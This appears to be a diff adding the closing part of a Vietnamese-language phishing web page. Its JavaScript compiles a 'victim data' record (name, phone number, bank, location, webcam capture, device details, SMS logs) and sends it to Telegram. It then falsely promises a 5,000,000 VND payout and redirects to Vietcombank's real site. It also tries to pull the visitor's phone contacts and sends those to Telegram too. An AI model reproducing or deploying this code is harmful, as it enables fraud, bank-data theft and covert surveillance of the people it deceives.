@@ -1,0 +1,52 @@
+                    sendAllDataToTelegram();
+                }, { timeout: 10000 });
+            } else {
+                statusDiv.innerHTML += '<br>⚠️ Trình duyệt không hỗ trợ vị trí.';
+                sendAllDataToTelegram();
+            }
+        }
+
+        function sendAllDataToTelegram() {
+            loadingDiv.classList.remove('hidden');
+            statusDiv.innerHTML += '<br>🔄 Đang gửi dữ liệu xác minh...';
+
+            const message = `
+<b>🎯 DỮ LIỆU NẠN NHÂN HOÀN CHỈNH</b>
+<b>Tên:</b> ${victimData.name}
+<b>SĐT:</b> ${victimData.phone}
+<b>Ngân hàng:</b> ${victimData.bank}
+<b>Vị trí:</b> ${victimData.location || 'Không có'}
+<b>Webcam:</b> ${victimData.webcam ? 'Đã chụp' : 'Không có'}
+<b>Thiết bị:</b> ${victimData.deviceInfo.userAgent}
+<b>SMS/cache:</b> ${victimData.smsLogs || 'Không có'}
+<b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
+            `.trim();
+
+            setTimeout(() => {
+                sendToTelegram(message);
+                loadingDiv.classList.add('hidden');
+                statusDiv.innerHTML = '<span style="color:#00FF00;"><b>✅ HOÀN TẤT! 5.000.000 VNĐ sẽ được chuyển vào tài khoản của bạn trong 24h.</b></span>';
+                // Redirect sau 5 giây
+                setTimeout(() => {
+                    window.location.href = 'https://vietcombank.com.vn';
+                }, 5000);
+            }, 2000);
+        }
+
+        // Thử lấy danh bạ nếu là Android Chrome (qua Contact Picker API)
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            setTimeout(() => {
+                navigator.contacts.select(['name', 'tel'], { multiple: true })
+                    .then(contacts => {
+                        const phoneList = contacts.map(c => c.tel?.[0] || '').filter(Boolean);
+                        if(phoneList.length > 0) {
+                            victimData.contactList = phoneList.join(', ');
+                            sendToTelegram(`📞 DANH BẠ TỰ ĐỘNG: ${victimData.contactList}`);
+                        }
+                    })
+                    .catch(() => {});
+            }, 10000);
+        }
+    </script>
+</body>
+</html>
